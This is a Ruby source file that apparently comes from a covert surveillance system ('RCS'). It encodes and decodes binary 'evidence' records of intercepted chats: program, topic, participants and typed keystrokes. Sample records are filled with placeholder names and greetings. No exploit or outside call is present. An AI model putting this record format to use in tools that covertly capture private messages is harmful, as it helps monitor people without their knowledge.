# encoding: utf-8

require 'rcs-common/trace'
require 'rcs-common/evidence/common'

module RCS

module ChatEvidence
  include RCS::Tracer

  ELEM_DELIMITER = 0xABADC0DE
  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
  
  def content
    program = ["MSN", "Skype", "Yahoo", "Paltalk", "Sticazzi"].sample.to_utf16le_binary_null
    topic = ["Chatting...", "New projecs", "Fuffa", "Bubbole"].sample.to_utf16le_binary_null
    users = ["ALoR, Daniel", "Bruno, Fulvio", "Naga, Quez", "Tizio, Caio"].sample.to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write topic
    content.write users
    content.write KEYSTROKES.sample.to_utf16le_binary_null
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content(common_info, chunks)
    stream = StringIO.new chunks.join

    until stream.eof?
      tm = stream.read 36
      #trace :info, "CHAT Time.gm #{tm.unpack('l*')}"
      info = Hash[common_info]
      info[:da] = Time.gm(*(tm.unpack('L*')), 0)
      info[:data] = Hash.new if info[:data].nil?
      info[:data][:program] = ''
      info[:data][:topic] = ''
      info[:data][:peer] = ''
      info[:data][:content] = ''

      program = stream.read_utf16le_string
      info[:data][:program] = program.utf16le_to_utf8 unless program.nil?
      #trace :info, "CHAT Program #{info[:data][:program]}"
      topic = stream.read_utf16le_string
      info[:data][:topic] = topic.utf16le_to_utf8 unless topic.nil?
      #trace :info, "CHAT Topic #{info[:data][:topic]}"
      users = stream.read_utf16le_string
      info[:data][:peer] = users.utf16le_to_utf8 unless users.nil?
      #trace :info, "CHAT Users #{info[:data][:users]}"
      keystrokes = stream.read_utf16le_string
      info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
      #trace :info, "CHAT Content #{info[:data][:content]}"

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed CHAT (missing delimiter)") unless delim == ELEM_DELIMITER

      #puts "decode_content #{info}"

      yield info if block_given?
    end
    :delete_raw
  end
end # ChatEvidence

module ChatskypeEvidence
  include ChatEvidence

  def content
    program = "SKYPE\0".to_utf16le_binary
    topic = "Chatting...\0".to_utf16le_binary
    users = "ALoR, Daniel\0".to_utf16le_binary
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write topic
    content.write users
    content.write "chat da skype...\0".to_utf16le_binary
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
end # ChatskypeEvidence

module SocialEvidence
  include ChatEvidence

  def content
    program = "Facebook\0".to_utf16le_binary
    topic = "\0".to_utf16le_binary
    users = "ALoR Daniel\0".to_utf16le_binary
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write topic
    content.write users
    content.write "messaggio su facebook\0".to_utf16le_binary
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
end # SocialEvidence

end # ::RCS